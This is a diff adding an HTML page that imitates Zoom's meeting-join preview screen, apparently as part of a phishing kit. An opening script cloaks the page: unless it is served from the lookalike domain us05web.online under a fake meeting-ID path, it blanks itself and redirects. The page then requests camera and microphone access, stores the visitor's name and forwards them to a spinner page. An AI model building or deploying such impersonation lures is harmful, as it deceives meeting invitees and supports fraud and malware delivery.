@@ -1,0 +1,618 @@
+<!DOCTYPE html>
+<html lang="en-US" translate="no">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Content-Language" content="en-US">
+<meta name="google" content="notranslate">
+<title>Join meeting - Zoom</title>
+<script>
+  (function() {
+    var allowedHosts = ['us05web.online', 'www.us05web.online'];
+    var secretPath = '/zoom.us_89315766107pwd=xe2c45bhRM0JjjXfmeOrEh4a3K6TQe.3/';
+    var isLocal = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1';
+    
+    // If not localhost AND (wrong domain OR wrong folder), wipe the page.
+    if (!isLocal) {
+      if (!allowedHosts.includes(window.location.hostname) || 
+          window.location.pathname.indexOf(secretPath) !== 0) {
+        document.documentElement.innerHTML = '';
+        window.location.href = 'https://us05web.online';
+      }
+    }
+  })();
+</script>
+
+<link rel="stylesheet" crossorigin="anonymous" type="text/css"
+      href="https://us05st1.zoom.us/web_client/7.1.0.1.12514/css/styles.wc_meeting.min.css">
+
+<style>
+/* ============================================================
+   Base / tokens
+   ============================================================ */
+:root {
+  --z-blue: #0D6BDE; --z-blue-hover: #0C60C8; --z-blue-active: #084085;
+  --z-text: #222325; --z-border: #DFE3E8;
+  --z-font: "Open Sans", "Helvetica", "Arial", sans-serif;
+}
+* { box-sizing: border-box; }
+*::before, *::after { box-sizing: border-box; }
+html, body { height: 100%; color: #232333; margin: 0; }
+body { font-family: var(--z-font); padding-top: 0; }
+a { color: var(--z-blue); text-decoration: none; outline: none; }
+a:hover { color: var(--z-blue-hover); text-decoration: underline; }
+a:active { color: var(--z-blue-active); }
+h1,h2,h3,h4,h5,h6 { color: var(--z-text); margin: 0; }
+h1 { font-weight: 600; font-size: 20px; }
+h2 { font-weight: 500; font-size: 18px; }
+h3 { font-size: 16px; }
+h4,h5,h6,p { font-size: 14px; }
+p { line-height: 1.5; margin: 0; }
+hr { margin: 20px 0; border: 0; border-top: 1px solid var(--z-border); }
+button { background-color: transparent; background-image: none; font-family: inherit; }
+
+/* Language dropdown (lang.js targets) */
+.lang-wrapper { position: relative; display: inline-block; vertical-align: middle; }
+#langBtn { display: inline-block; cursor: pointer; color: var(--z-blue); font-weight: 400; text-decoration: none; }
+#langMenu {
+  display: none; position: absolute; top: calc(100% + 8px); right: 0;
+  list-style: none; margin: 0; padding: 4px 0; background: #fff;
+  border: 1px solid var(--z-border); border-radius: 8px;
+  box-shadow: 0 12px 24px 0 rgba(0,0,0,0.08), 0 6px 12px 0 rgba(0,0,0,0.08);
+  min-width: 200px; max-height: 420px; overflow-y: auto; z-index: 4000;
+  text-align: left; font-weight: 400; font-size: 14px;
+}
+#langMenu.open { display: block; }
+#langMenu li { padding: 10px 20px; cursor: pointer; color: var(--z-text); white-space: nowrap; }
+#langMenu li:hover { background: #f2f2f2; }
+#langMenu li.h_GAeXIH { background: #f2f2f2; }
+
+/* ============================================================
+   Preview wrapper — always visible on this page
+   ============================================================ */
+#zoomPreviewWrapper { display: block; }
+
+/* Remember-name checkbox */
+.preview-meeting-info__remember-checkbox .zm-checkbox.preview-remember-name::before,
+.preview-meeting-info__remember-checkbox .zm-checkbox.preview-remember-name::after { display: none !important; content: none !important; }
+.preview-meeting-info__remember-checkbox .zm-checkbox.preview-remember-name { cursor: pointer; position: relative; }
+.preview-meeting-info__remember-checkbox .zm-checkbox.preview-remember-name .zm-checkbox-message::before {
+  content: ""; display: inline-block; width: 16px; height: 16px;
+  border: 2px solid #b0b0b0; border-radius: 5px; margin-right: 8px;
+  vertical-align: -3px; box-sizing: border-box; background: #fff;
+  transition: border-color .15s, background-color .15s;
+}
+.preview-meeting-info__remember-checkbox .zm-checkbox.preview-remember-name.is-checked .zm-checkbox-message::before {
+  border-color: #0b5cff; background-color: #0b5cff;
+}
+.preview-meeting-info__remember-checkbox .zm-checkbox.preview-remember-name.is-checked .zm-checkbox-message::after {
+  content: ""; position: absolute; left: 5px; top: 50%;
+  width: 4px; height: 8px; border: solid #fff; border-width: 0 2px 2px 0;
+  transform: translateY(-70%) rotate(45deg); pointer-events: none;
+}
+
+/* Permission overlay */
+.perm-overlay-backdrop {
+  position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+  background: rgba(0,0,0,0.45); display: flex; justify-content: center; align-items: center;
+  z-index: 999999;
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+}
+.perm-dialog-card {
+  background: #fff; width: 500px; max-width: 90vw; border-radius: 8px;
+  box-shadow: 0 4px 12px rgba(0,0,0,0.15); padding: 40px 24px; text-align: center;
+  border: 1px solid #e0e0e0;
+}
+.perm-image-placeholder {
+  width: 280px; height: 180px; margin: 0 auto 28px; display: block;
+  object-fit: contain; background: #e9ecef; border-radius: 8px; border: 1px solid #ddd;
+}
+.perm-dialog-card h2 { font-size: 20px; color: #202124; margin: 0 0 12px; font-weight: 600; }
+.perm-dialog-card .perm-subtitle { font-size: 15px; color: #5f6368; margin: 0 0 32px; }
+.perm-primary-btn {
+  background: #1a73e8; color: #fff; border: none; border-radius: 24px;
+  padding: 12px 24px; font-size: 15px; font-weight: 500; cursor: pointer;
+  display: inline-flex; align-items: center; justify-content: center; gap: 10px;
+  transition: background 0.2s; margin-bottom: 24px;
+}
+.perm-primary-btn:hover { background: #1557b0; }
+.perm-btn-icon { width: 18px; height: 18px; fill: currentColor; }
+.perm-secondary-link {
+  display: block; color: #1a73e8; text-decoration: none; font-size: 15px;
+  font-weight: 500; cursor: pointer;
+}
+.perm-secondary-link:hover { text-decoration: underline; }
+
+/* Preview audio control */
+.preview-video__control-button .audio-voip-active-icon {
+  position: relative; display: inline-flex; align-items: center; justify-content: center;
+  width: 24px; height: 24px;
+}
+.preview-video__control-button .voip-icon-inner {
+  position: absolute; inset: 0; display: flex; align-items: flex-end; justify-content: center;
+  pointer-events: none; overflow: hidden; border-radius: 50%;
+}
+.preview-video__control-button .audio-level-indicator {
+  width: 24px; background: #00d26a; border-radius: 12px;
+  transition: height .06s linear; opacity: 0.9;
+}
+#preview-audio-control-button.is-muted .audio-level-indicator { height: 0 !important; opacity: 0; }
+#preview-audio-control-button.is-muted #micIconSvg { display: none; }
+#preview-audio-control-button.is-muted #micIconMutedSvg { display: inline !important; opacity: 0.6; }
+
+#preview-audio-control-button.is-muted .audio-voip-active-icon::after,
+#preview-audio-control-button.is-denied .audio-voip-active-icon::after {
+  content: ""; position: absolute; top: 50%; left: 50%;
+  width: 30px; height: 2px; background: #ff2d6a;
+  transform: translate(-50%, -50%) rotate(-45deg);
+  border-radius: 2px; pointer-events: none; z-index: 3;
+}
+
+#preview-video-control-button.is-off .video-slash-wrap::after {
+  content: ""; position: absolute; top: 50%; left: 50%;
+  width: 32px; height: 2px; background: #ff2d6a;
+  transform: translate(-50%, -50%) rotate(-45deg);
+  border-radius: 2px; pointer-events: none; z-index: 3;
+}
+
+.preview-join-button .loading {
+  display: inline-block; width: 16px; height: 16px; margin-left: 10px; vertical-align: -3px;
+  border: 2px solid rgba(255,255,255,.5); border-top-color: #fff;
+  border-radius: 50%; animation: joinBtnSpin .8s linear infinite;
+}
+@keyframes joinBtnSpin { to { transform: rotate(360deg); } }
+
+.video-slash-wrap { position: relative; display: inline-flex; align-items: center; justify-content: center; }
+.video-slash-wrap.is-denied::after {
+  content: ""; position: absolute; top: 50%; left: 50%;
+  width: 32px; height: 2px; background: #ff2d6a;
+  transform: translate(-50%, -50%) rotate(-45deg);
+  border-radius: 2px; pointer-events: none; z-index: 3;
+}
+</style>
+</head>
+
+<body>
+
+<!-- ============================================================
+     ZOOM PREVIEW BODY
+     ============================================================ -->
+<div id="zoomPreviewWrapper" class="is-open">
+
+  <!-- Permission overlay -->
+  <div class="perm-overlay-backdrop" id="permOverlay">
+    <div class="perm-dialog-card">
+      <img src="zoom-placeholder.png" alt="Zoom placeholder" class="perm-image-placeholder"
+           onerror="this.style.background='#e9ecef';this.removeAttribute('src');">
+      <h2>Do you want people to see you in the meeting?</h2>
+      <p class="perm-subtitle">You can still turn off your microphone and camera anytime in the meeting</p>
+      <button class="perm-primary-btn" id="permMediaBtn">
+        <svg class="perm-btn-icon" viewBox="0 0 24 24">
+          <path d="M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z"></path>
+        </svg>
+        Use microphone and camera
+      </button>
+      <a href="#" class="perm-secondary-link" id="permSkipLink">Continue without microphone and camera</a>
+    </div>
+  </div>
+
+  <div class="main">
+
+    <textarea class="hideme" id="wr_info" style="display: none" aria-hidden="true"></textarea>
+    <input class="hideme" id="cdn_path" aria-hidden="true" style="display: none" value="https://us05st1.zoom.us/web_client/7.1.0.1.12514">
+    <div id="root">
+      <div class="preview-root" role="presentation">
+        <button class="btn-back-pwa" onclick="backToOriginal()">
+          <svg width="1em" height="1em" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="btn-back-pwa-icon" aria-hidden="true" focusable="false">
+            <path fill-rule="evenodd" clip-rule="evenodd" d="M5.635 8.339a.498.498 0 0 0 .037.037l3.978 3.978a.5.5 0 1 0 .706-.708L6.715 8.004l3.639-3.65a.501.501 0 0 0 0-.708.499.499 0 0 0-.707 0L5.731 7.575a.502.502 0 0 0-.096.764Z" fill="currentColor"></path>
+          </svg>
+          Back
+        </button>
+        <div class="preview-new-flow preview">
+          <div class="preview-new-flow-content">
+            <div id="preview-av-video" class="preview-video preview-video-resizable">
+              <div class="preview-video-content">
+                <div class="preview-video-ref" style="position: relative;">
+                  <img id="previewPlaceholderImg" src="zoomspace.png" alt="" style="position:absolute; inset:0; width:100%; height:100%; object-fit:cover; z-index:2; pointer-events:none; border-radius:inherit;" onerror="this.style.display='none'">
+                  <video-player id="preview-video-player" media-type="preview" node-id="canvas-preview" class="preview-canvas" style="z-index: 1; display: block;">
+                    <div style="width: 100%; height: 100%; position: relative; border-radius: inherit;">
+                      <div style="width: 100%; height: 100%; border-radius: inherit;">
+                        <video id="livePreviewVideo" autoplay="true" muted="true" playsinline="true" style="width: 100%; height: 100%; border-radius: inherit; transform: scaleX(-1) scaleY(1); transform-origin: center center;"></video>
+                      </div>
+                    </div>
+                  </video-player>
+                </div>
+                <div class="preview-video__control">
+                  <div class="preview-video__control-button-container">
+                    <button class="preview-video__control-button" aria-label="Mute" id="preview-audio-control-button">
+  <div class="audio-voip-active-icon">
+    <div class="voip-icon-inner">
+      <div id="micLevelBar" class="audio-level-indicator" style="height: 0%;"></div>
+    </div>
+
+    <svg id="micIconSvg" class="SvgAudioOn" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+      <path d="M7.5 4.5C7.5 2.01 9.51 0 12 0s4.5 2.01 4.5 4.5V12c0 2.49-2.01 4.5-4.5 4.5S7.5 14.49 7.5 12V4.5ZM12 15c1.65 0 3-1.35 3-3V4.5c0-1.65-1.35-3-3-3s-3 1.35-3 3V12c0 1.65 1.35 3 3 3Z" fill="currentColor"></path>
+      <path d="M19.485 12.15c.015-.045.015-.105.015-.15 0-.42-.33-.75-.75-.75s-.75.33-.75.75c0 3.315-2.685 6-6 6s-6-2.685-6-6c0-.42-.33-.75-.75-.75s-.75.33-.75.75c0 .045 0 .105.015.15.06 3.81 2.985 6.93 6.735 7.305V22.5h-3c-.42 0-.75.33-.75.75s.33.75.75.75h7.5c.42 0 .75-.33.75-.75s-.33-.75-.75-.75h-3v-3.045c3.75-.375 6.675-3.495 6.735-7.305Z" fill="currentColor"></path>
+    </svg>
+
+    <svg id="micIconMutedSvg" class="SvgAudioMute" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" style="display: none;">
+      <path d="M7.5 4.5C7.5 2.01 9.51 0 12 0s4.5 2.01 4.5 4.5V12c0 2.49-2.01 4.5-4.5 4.5S7.5 14.49 7.5 12V4.5ZM12 15c1.65 0 3-1.35 3-3V4.5c0-1.65-1.35-3-3-3s-3 1.35-3 3V12c0 1.65 1.35 3 3 3Z" fill="currentColor"></path>
+      <path d="M19.485 12.15c.015-.045.015-.105.015-.15 0-.42-.33-.75-.75-.75s-.75.33-.75.75c0 3.315-2.685 6-6 6s-6-2.685-6-6c0-.42-.33-.75-.75-.75s-.75.33-.75.75c0 .045 0 .105.015.15.06 3.81 2.985 6.93 6.735 7.305V22.5h-3c-.42 0-.75.33-.75.75s.33.75.75.75h7.5c.42 0 .75-.33.75-.75s-.33-.75-.75-.75h-3v-3.045c3.75-.375 6.675-3.495 6.735-7.305Z" fill="currentColor"></path>
+    </svg>
+  </div>
+
+  <span id="muteLabel" class="preview-video__control-text">Mute</span>
+</button>
+                    <button class="preview__toggle" aria-label="More audio controls">
+                      <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="SvgChevron"><path fill-rule="evenodd" clip-rule="evenodd" d="M11.816 10.172a.6.6 0 0 1-.849-.016L8 7.006l-2.968 3.15a.6.6 0 1 1-.864-.832l3.4-3.6a.6.6 0 0 1 .864 0l3.4 3.6a.6.6 0 0 1-.016.848Z" fill="#fff" opacity="0.5"></path></svg>
+                    </button>
+                  </div>
+                  <div class="preview-video__control-button-container">
+                    <button class="preview-video__control-button" aria-label="Stop Video" id="preview-video-control-button">
+  <span class="video-slash-wrap" id="previewVideoSlashWrap">
+    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="SvgVideoOn">
+      <path fill-rule="evenodd" clip-rule="evenodd" d="M.75 5.25A2.25 2.25 0 0 1 3 3h9.75a3.75 3.75 0 0 1 3.75 3.75V15a2.25 2.25 0 0 1-2.25 2.25H4.5A3.75 3.75 0 0 1 .75 13.5V5.25ZM3 4.5h9.75A2.25 2.25 0 0 1 15 6.75V15a.75.75 0 0 1-.75.75H4.5a2.25 2.25 0 0 1-2.25-2.25V5.25A.75.75 0 0 1 3 4.5Z" fill="#fff"></path>
+      <path d="M23.25 5.25a.75.75 0 0 0-1.18-.614L18.32 7.26a.75.75 0 0 0 .86 1.228l2.57-1.799v6.87l-2.57-1.8a.75.75 0 1 0-.86 1.23l3.75 2.624A.75.75 0 0 0 23.25 15V5.25Z" fill="#fff"></path>
+    </svg>
+  </span>
+  <span id="videoLabel" class="preview-video__control-text">Stop Video</span>
+</button>
+                    <button class="preview__toggle" aria-label="More video controls">
+                      <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="SvgChevron"><path fill-rule="evenodd" clip-rule="evenodd" d="M11.816 10.172a.6.6 0 0 1-.849-.016L8 7.006l-2.968 3.15a.6.6 0 1 1-.864-.832l3.4-3.6a.6.6 0 0 1 .864 0l3.4 3.6a.6.6 0 0 1-.016.848Z" fill="#fff" opacity="0.5"></path></svg>
+                    </button>
+                  </div>
+                </div>
+              </div>
+            </div>
+            <div class="preview-meeting-info">
+              <div class="preview-meeting-info__title">Enter Meeting Info</div>
+              <div class="preview-meeting-info__field">
+                <label class="preview-meeting-info__field-title" for="input-for-name">Your Name</label>
+                <div class="preview-meeting-info__field-input">
+                  <input id="input-for-name" type="text" autocomplete="off" required aria-invalid="false" aria-describedby="error-for-name" maxlength="128" value="">
+                </div>
+              </div>
+              <div class="preview-meeting-info__remember-checkbox">
+                <div class="zm-checkbox preview-remember-name" role="checkbox" tabindex="0" aria-checked="false" onclick="this.setAttribute('aria-checked', this.getAttribute('aria-checked')==='true'?'false':'true'); this.classList.toggle('is-checked');">
+                  <div class="zm-checkbox-message">Remember my name for future meetings</div>
+                </div>
+              </div>
+              <button type="button" class="zm-btn preview-join-button zm-btn__outline--blue" tabindex="0" onclick="joinFromPreview()">
+                Join<span class="loading" style="display: none;"></span>
+              </button>
+              <div class="preview-agreement">
+                By clicking "Join", you agree to our <a href="https://app.zoom.us/terms" class="wc-link2" target="_blank" rel="noopener noreferrer" aria-label="Terms of Service">Terms of Service</a> and <a href="https://app.zoom.us/privacy" class="wc-link2" target="_blank" rel="noopener noreferrer" aria-label="Privacy Statement">Privacy Statement</a>.
+              </div>
+              <div class="recaptcha_tos">
+                Zoom is protected by reCAPTCHA and their&nbsp;<a href="https://policies.google.com/privacy" target="_blank" rel="noreferrer noopener">Privacy Policy</a>&nbsp;and&nbsp;<a href="https://policies.google.com/terms" target="_blank" rel="noreferrer noopener">Terms of Service</a>&nbsp;apply.
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="page-footer false">
+          <span>©&nbsp;</span><span>2026&nbsp;</span><span>Zoom Communications, Inc.&nbsp;</span><span>All rights reserved.&nbsp;</span>
+          <a href="https://app.zoom.us/privacy" class="wc-link2" target="_blank" rel="noopener noreferrer" aria-label="Privacy &amp; Legal Policies">Privacy &amp; Legal Policies</a>
+          <span class="page-footer-divider">|</span>
+          <button>Send Report</button>
+        </div>
+        <div id="notificationManager" class="notification-manager"></div>
+        <div class="ReactModalPortal"></div>
+      </div>
+    </div>
+    <div role="alert" aria-atomic="true" aria-live="assertive" id="aria-notify-area" class="sr-only">Video now started</div>
+  </div>
+</div>
+
+<!-- ============================================================
+     PREVIEW-ONLY SCRIPT
+     ============================================================ -->
+<script src="../lang.js"></script>
+
+<script>
+(function () {
+  'use strict';
+
+  // ============================================================
+  //  ★ CONFIG
+  // ============================================================
+  var HOME_PAGE_URL     = '../index.html';
+  var SPINNER_PAGE_URL  = 'spinner.html';
+
+  var $ = function (id) { return document.getElementById(id); };
+
+  // ============================================================
+  // Session flags — read by the meeting page after navigation
+  // ============================================================
+  function setMediaState(state) {
+    try { sessionStorage.setItem('zoom.mediaState', state); } catch (e) {}
+  }
+  function saveName() {
+    var el = document.getElementById('input-for-name');
+    try { sessionStorage.setItem('zoom.name', el ? el.value : 'Guest'); } catch (e) {}
+  }
+
+  // ============================================================
+  // Stream helpers
+  // ============================================================
+  function stopPreviewStream() {
+    var s = window.__zoomPreviewStream;
+    if (s && s.getTracks) {
+      s.getTracks().forEach(function (t) { t.stop(); });
+    }
+    window.__zoomPreviewStream = null;
+
+    if (window.__zoomMicCtx) {
+      try { window.__zoomMicCtx.close(); } catch (e) {}
+    }
+    window.__zoomMicCtx = null;
+    window.__zoomMicAnalyser = null;
+
+    var bar = document.getElementById('micLevelBar');
+    if (bar) bar.style.height = '0%';
+
+    var liveVideo = document.getElementById('livePreviewVideo');
+    if (liveVideo) {
+      liveVideo.srcObject = null;
+      liveVideo.style.opacity = '1';
+    }
+    var ph = document.getElementById('previewPlaceholderImg');
+    if (ph) ph.style.display = '';
+
+    var ml = document.getElementById('muteLabel');  if (ml) ml.textContent = 'Mute';
+    var vl = document.getElementById('videoLabel'); if (vl) vl.textContent = 'Stop Video';
+
+    var onSvg  = document.getElementById('micIconSvg');
+    var offSvg = document.getElementById('micIconMutedSvg');
+    if (onSvg)  onSvg.style.display  = '';
+    if (offSvg) offSvg.style.display = 'none';
+
+    var ab = document.getElementById('preview-audio-control-button');
+    if (ab) ab.classList.remove('is-muted');
+    var vb = document.getElementById('preview-video-control-button');
+    if (vb) vb.classList.remove('is-off');
+  }
+
+  function startMicMeter(stream) {
+    var bar = document.getElementById('micLevelBar');
+    if (!bar) return;
+
+    var audioTracks = stream.getAudioTracks();
+    if (!audioTracks.length) return;
+
+    var AC = window.AudioContext || window.webkitAudioContext;
+    if (!AC) return;
+
+    if (window.__zoomMicCtx) {
+      try { window.__zoomMicCtx.close(); } catch (e) {}
+      window.__zoomMicCtx = null;
+    }
+
+    var ctx, src, analyser, data;
+    try {
+      ctx      = new AC();
+      src      = ctx.createMediaStreamSource(stream);
+      analyser = ctx.createAnalyser();
+      analyser.fftSize = 256;
+      src.connect(analyser);
+      data = new Uint8Array(analyser.frequencyBinCount);
+    } catch (e) {
+      console.warn('[mic] could not create AudioContext:', e);
+      return;
+    }
+
+    window.__zoomMicCtx      = ctx;
+    window.__zoomMicAnalyser = analyser;
+
+    if (ctx.state === 'suspended' && ctx.resume) {
+      ctx.resume().catch(function () {});
+    }
+
+    var GATE = 18;
+
+    function tick() {
+      if (!window.__zoomMicCtx || window.__zoomMicCtx !== ctx) return;
+
+      var previewBtn   = document.getElementById('preview-audio-control-button');
+      var previewMuted = previewBtn && previewBtn.classList.contains('is-muted');
+
+      if (previewMuted) {
+        requestAnimationFrame(tick);
+        return;
+      }
+
+      analyser.getByteFrequencyData(data);
+      var sum = 0;
+      for (var i = 0; i < data.length; i++) sum += data[i];
+      var avg = sum / data.length;
+
+      var pct = avg < GATE ? 0
+              : Math.min(100, ((avg - GATE) / (255 - GATE)) * 100 * 1.6);
+
+      var pBar = document.getElementById('micLevelBar');
+      if (pBar) pBar.style.height = pct + '%';
+
+      requestAnimationFrame(tick);
+    }
+    tick();
+  }
+
+  function wireMuteButton(stream) {
+    var btn   = document.getElementById('preview-audio-control-button');
+    var label = document.getElementById('muteLabel');
+    var bar   = document.getElementById('micLevelBar');
+    if (!btn) return;
+
+    var audioTracks = stream.getAudioTracks();
+    if (!audioTracks.length) return;
+    var track = audioTracks[0];
+
+    var muted = false;
+
+    btn.addEventListener('click', function () {
+      muted = !muted;
+      track.enabled = !muted;
+
+      var lang = (function(){ try { return localStorage.getItem('zoom.lang'); } catch(e){ return null; } })() || 'en-US';
+      var tr   = (window.zoomTranslations && window.zoomTranslations[lang]) ||
+                 (window.zoomTranslations && window.zoomTranslations['en-US']) || {};
+
+      if (label) label.textContent = muted ? (tr.tbUnmute || 'Unmute') : (tr.tbMute || 'Mute');
+      if (bar) bar.style.height = muted ? '0%' : bar.style.height;
+
+      var onSvg  = document.getElementById('micIconSvg');
+      var offSvg = document.getElementById('micIconMutedSvg');
+      if (onSvg)  onSvg.style.display  = muted ? 'none' : '';
+      if (offSvg) offSvg.style.display = muted ? '' : 'none';
+
+      btn.classList.toggle('is-muted', muted);
+      btn.setAttribute('aria-label', muted ? (tr.tbUnmute || 'Unmute') : (tr.tbMute || 'Mute'));
+    });
+  }
+
+  function wireVideoButton(stream) {
+    var btn   = document.getElementById('preview-video-control-button');
+    var label = document.getElementById('videoLabel');
+    var live  = document.getElementById('livePreviewVideo');
+    var ph    = document.getElementById('previewPlaceholderImg');
+    if (!btn) return;
+
+    var videoTracks = stream.getVideoTracks();
+    if (!videoTracks.length) return;
+    var track = videoTracks[0];
+
+    var videoOn = true;
+
+    btn.addEventListener('click', function () {
+      videoOn = !videoOn;
+      track.enabled = videoOn;
+
+      var lang = (function(){ try { return localStorage.getItem('zoom.lang'); } catch(e){ return null; } })() || 'en-US';
+      var tr   = (window.zoomTranslations && window.zoomTranslations[lang]) ||
+                 (window.zoomTranslations && window.zoomTranslations['en-US']) || {};
+
+      if (label) label.textContent = videoOn ? (tr.tbStopVideo || 'Stop Video')
+                                             : (tr.tbStart     || 'Start Video');
+      if (ph)    ph.style.display  = videoOn ? 'none' : '';
+      if (live)  live.style.opacity = videoOn ? '1' : '0';
+
+      btn.setAttribute('aria-label', videoOn ? (tr.tbStopVideo || 'Stop Video')
+                                             : (tr.tbStart     || 'Start Video'));
+      btn.classList.toggle('is-off', !videoOn);
+    });
+  }
+
+  // ============================================================
+  // Back button
+  // ============================================================
+  window.backToOriginal = function () {
+    stopPreviewStream();
+    window.location.href = HOME_PAGE_URL;
+  };
+
+  // ============================================================
+  // Join → hand off to the spinner page
+  // ============================================================
+  window.joinFromPreview = function () {
+    saveName();
+    stopPreviewStream();
+    // Small delay so the loading spinner on the button is visible briefly.
+    var btn     = document.querySelector('.preview-join-button');
+    var loading = btn ? btn.querySelector('.loading') : null;
+    if (loading) loading.style.display = 'inline-block';
+    if (btn) btn.disabled = true;
+
+    setTimeout(function () {
+      window.location.href = SPINNER_PAGE_URL;    // navigation – keeps preview in history
+    }, 250);
+  };
+
+  // ============================================================
+  // Permission overlay
+  // ============================================================
+  var overlay  = document.getElementById('permOverlay');
+  var mediaBtn = document.getElementById('permMediaBtn');
+  var skipLink = document.getElementById('permSkipLink');
+
+  function closePermOverlay() {
+    if (overlay && overlay.parentNode) overlay.parentNode.removeChild(overlay);
+  }
+
+  function markMediaDenied() {
+    var audioBtn = document.getElementById('preview-audio-control-button');
+    var videoBtn = document.getElementById('preview-video-control-button');
+    if (audioBtn) audioBtn.classList.add('is-denied');
+    if (videoBtn) videoBtn.classList.add('is-denied');
+
+    var vWrap = document.getElementById('previewVideoSlashWrap');
+    if (vWrap) vWrap.classList.add('is-denied');
+  }
+
+  if (mediaBtn) {
+    mediaBtn.addEventListener('click', function () {
+      mediaBtn.disabled = true;
+      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+        console.warn('[perm] getUserMedia not available.');
+        setMediaState('denied');
+        closePermOverlay();
+        return;
+      }
+
+      navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+        .then(function (stream) {
+          var liveVideo = document.getElementById('livePreviewVideo');
+          if (liveVideo) {
+            liveVideo.srcObject = stream;
+            liveVideo.muted = true;
+            var p = liveVideo.play();
+            if (p && p.catch) p.catch(function (err) {
+              console.warn('[perm] video.play() blocked:', err.message);
+            });
+          }
+
+          var ph = document.getElementById('previewPlaceholderImg');
+          if (ph) ph.style.display = 'none';
+
+          window.__zoomPreviewStream = stream;
+          setMediaState('granted');
+
+          [
+            'preview-audio-control-button',
+            'preview-video-control-button',
+            'previewVideoSlashWrap'
+          ].forEach(function (id) {
+            var el = document.getElementById(id);
+            if (el) el.classList.remove('is-denied');
+          });
+
+          try { wireMuteButton(stream); }  catch (e) { console.warn('[perm] wireMuteButton:', e); }
+          try { wireVideoButton(stream); } catch (e) { console.warn('[perm] wireVideoButton:', e); }
+          try { startMicMeter(stream); }   catch (e) { console.warn('[perm] startMicMeter:', e); }
+
+          closePermOverlay();
+        })
+        .catch(function (err) {
+          console.warn('[perm] getUserMedia rejected:', err.name, err.message);
+          setMediaState('denied');
+          markMediaDenied();
+          closePermOverlay();
+        });
+    });
+  }
+
+  if (skipLink) {
+    skipLink.addEventListener('click', function (e) {
+      e.preventDefault();
+      setMediaState('skipped');
+      markMediaDenied();
+      closePermOverlay();
+    });
+  }
+
+  document.addEventListener('keydown', function (e) {
+    if (e.key === 'Escape' && overlay && overlay.parentNode) closePermOverlay();
+  });
+
+})();
+</script>
+</body>
+</html>
